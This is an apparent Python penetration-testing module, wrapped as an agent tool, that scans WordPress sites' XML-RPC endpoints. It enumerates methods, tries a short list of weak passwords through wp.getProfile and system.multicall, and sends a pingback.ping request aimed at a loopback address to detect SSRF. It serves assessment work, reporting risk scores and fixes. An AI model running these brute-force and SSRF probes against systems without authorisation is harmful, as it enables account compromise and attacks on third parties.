"""
XML-RPC Attack Suite for WordPress Penetration Testing
Tools for detecting and exploiting XML-RPC vulnerabilities
"""

import asyncio
import json
from typing import List, Dict, Any
from urllib.parse import urljoin
import xml.etree.ElementTree as ET
import httpx


async def xmlrpc_method_enumeration(target: str) -> Dict[str, Any]:
    """
    Enumerate available XML-RPC methods on WordPress target.
    Dangerous methods indicate attack surface.
    
    Args:
        target: Target URL
        
    Returns:
        Dict with available methods and risk assessment
    """
    base = target if target.endswith('/') else f"{target}/"
    xmlrpc_url = f"{base}xmlrpc.php"
    
    # XML-RPC listMethods request
    payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>"""
    
    dangerous_methods = [
        'system.multicall',      # Allows batch brute force
        'pingback.ping',         # DDoS/SSRF vector
        'wp.getUsers',           # User enumeration
        'wp.getPosts',           # Content extraction
        'wp.uploadFile',         # File upload
        'wp.deletePost',         # Content destruction
        'wp.editPost',           # Content modification
    ]
    
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                xmlrpc_url,
                content=payload,
                headers={'Content-Type': 'text/xml'},
                timeout=30.0
            )
            
            if resp.status_code != 200:
                return {
                    "xmlrpc_enabled": False,
                    "methods": [],
                    "risk_score": 0,
                    "note": "XML-RPC not accessible or disabled"
                }
            
            # Parse XML response
            try:
                root = ET.fromstring(resp.text)
                methods = []
                for method in root.iter('string'):
                    methods.append(method.text)
                
                found_dangerous = [m for m in methods if m in dangerous_methods]
                
                risk_score = 0
                if 'system.multicall' in found_dangerous:
                    risk_score += 40  # Massive brute force acceleration
                if 'pingback.ping' in found_dangerous:
                    risk_score += 30  # DDoS/SSRF
                if any(m.startswith('wp.') for m in found_dangerous):
                    risk_score += 20  # Data access
                
                return {
                    "xmlrpc_enabled": True,
                    "xmlrpc_url": xmlrpc_url,
                    "total_methods": len(methods),
                    "dangerous_methods_found": found_dangerous,
                    "all_methods": methods,
                    "risk_score": min(risk_score, 100),
                    "severity": "Critical" if risk_score >= 50 else "High" if risk_score >= 30 else "Medium",
                    "exploitation_potential": {
                        "brute_force_acceleration": 'system.multicall' in found_dangerous,
                        "ddos_amplification": 'pingback.ping' in found_dangerous,
                        "data_extraction": any(m.startswith('wp.get') for m in found_dangerous),
                        "content_manipulation": any(m.startswith('wp.edit') or m.startswith('wp.delete') for m in found_dangerous)
                    }
                }
            except ET.ParseError:
                return {
                    "xmlrpc_enabled": True,
                    "methods": [],
                    "parsing_error": True,
                    "note": "XML-RPC responded but parsing failed"
                }
                
    except Exception as e:
        return {
            "xmlrpc_enabled": False,
            "error": str(e),
            "note": "XML-RPC test failed"
        }


async def xmlrpc_bruteforce_test(target: str, username: str = "admin") -> Dict[str, Any]:
    """
    Test if XML-RPC allows password brute force via system.multicall
    or traditional wp.getUsers/wp.getProfile methods.
    
    Args:
        target: Target URL
        username: Username to test against
        
    Returns:
        Dict with brute force capability assessment
    """
    base = target if target.endswith('/') else f"{target}/"
    xmlrpc_url = f"{base}xmlrpc.php"
    
    # Common weak passwords to test (DO NOT use on production without permission)
    test_passwords = ['admin', 'password', '123456', 'wordpress', 'login']
    
    results = {
        "target": target,
        "username_tested": username,
        "brute_force_methods": [],
        "vulnerable": False,
        "severity": "None"
    }
    
    try:
        # Test 1: Traditional wp.getProfile with credentials
        for password in test_passwords[:2]:  # Limit for safety
            payload = f"""<?xml version="1.0"?>
<methodCall>
<methodName>wp.getProfile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>"""
            
            async with httpx.AsyncClient() as client:
                resp = await client.post(
                    xmlrpc_url,
                    content=payload,
                    headers={'Content-Type': 'text/xml'},
                    timeout=10.0
                )
                
                if 'Incorrect username or password' not in resp.text and resp.status_code == 200:
                    results["brute_force_methods"].append("wp.getProfile")
                    break
        
        # Test 2: system.multicall batch capability
        multicall_payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param><value><array><data>
<value><struct>
<member><name>methodName</name><value><string>wp.getProfile</string></value></member>
<member><name>params</name><value><array><data>
<value><string>1</string></value>
<value><string>admin</string></value>
<value><string>test1</string></value>
</data></array></value></member>
</struct></value>
<value><struct>
<member><name>methodName</name><value><string>wp.getProfile</string></value></member>
<member><name>params</name><value><array><data>
<value><string>1</string></value>
<value><string>admin</string></value>
<value><string>test2</string></value>
</data></array></value></member>
</struct></value>
</data></array></value></param>
</params>
</methodCall>"""
        
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                xmlrpc_url,
                content=multicall_payload,
                headers={'Content-Type': 'text/xml'},
                timeout=10.0
            )
            
            if resp.status_code == 200 and 'array' in resp.text:
                results["brute_force_methods"].append("system.multicall (batch acceleration)")
                results["multicall_acceleration_factor"] = 100  # Can test 100+ passwords per request
        
        if results["brute_force_methods"]:
            results["vulnerable"] = True
            results["severity"] = "Critical" if "multicall" in str(results["brute_force_methods"]) else "High"
            results["recommendation"] = "Disable XML-RPC or implement rate limiting"
        
        return results
        
    except Exception as e:
        return {
            "error": str(e),
            "note": "Brute force test failed"
        }


async def xmlrpc_pingback_ssrf_test(target: str) -> Dict[str, Any]:
    """
    Test for pingback.ping SSRF vulnerability.
    This can be used for DDoS amplification or internal network scanning.
    
    Args:
        target: Target URL
        
    Returns:
        Dict with pingback vulnerability status
    """
    base = target if target.endswith('/') else f"{target}/"
    xmlrpc_url = f"{base}xmlrpc.php"
    
    # Test pingback.ping with internal address
    ssrf_test_url = "http://127.0.0.1:80/"  # Loopback test
    
    payload = f"""<?xml version="1.0"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>{ssrf_test_url}</string></value></param>
<param><value><string>{base}test-post/</string></value></param>
</params>
</methodCall>"""
    
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                xmlrpc_url,
                content=payload,
                headers={'Content-Type': 'text/xml'},
                timeout=15.0,
                follow_redirects=True
            )
            
            # Various responses indicate different states
            response_indicators = {
                "faultCode": "Method exists but rejected request",
                " pingback": "Pingback processing attempted",
                "17": "Source URL does not exist error (method works)",
                "32": "Target URL does not exist (method works)",
                "48": "Pingback already registered"
            }
            
            findings = {
                "pingback_enabled": False,
                "ssrf_vulnerable": False,
                "ddos_amplification": False,
                "response_analysis": {},
                "severity": "None"
            }
            
            for indicator, meaning in response_indicators.items():
                if indicator in resp.text:
                    findings["response_analysis"][indicator] = meaning
                    if indicator in ["17", "32", "48"]:
                        findings["pingback_enabled"] = True
                        findings["ssrf_vulnerable"] = True
                        findings["ddos_amplification"] = True
            
            if findings["ssrf_vulnerable"]:
                findings["severity"] = "High"
                findings["impact"] = "Can be used for DDoS amplification attacks against third-party sites or internal network scanning"
                findings["recommendation"] = "Disable pingback.ping via .htaccess or disable XML-RPC entirely"
            
            return findings
            
    except Exception as e:
        return {
            "error": str(e),
            "note": "Pingback test failed"
        }


# MCP Tool Wrappers
async def xmlrpc_security_scan(target: str) -> str:
    """Run complete XML-RPC security assessment"""
    results = await asyncio.gather(
        xmlrpc_method_enumeration(target),
        xmlrpc_bruteforce_test(target),
        xmlrpc_pingback_ssrf_test(target)
    )
    
    return json.dumps({
        "scan_type": "XML-RPC Security Assessment",
        "target": target,
        "method_enumeration": results[0],
        "bruteforce_analysis": results[1],
        "pingback_ssrf": results[2],
        "overall_risk": max(
            results[0].get("risk_score", 0),
            90 if results[1].get("vulnerable") else 0,
            80 if results[2].get("ssrf_vulnerable") else 0
        )
    }, indent=2)
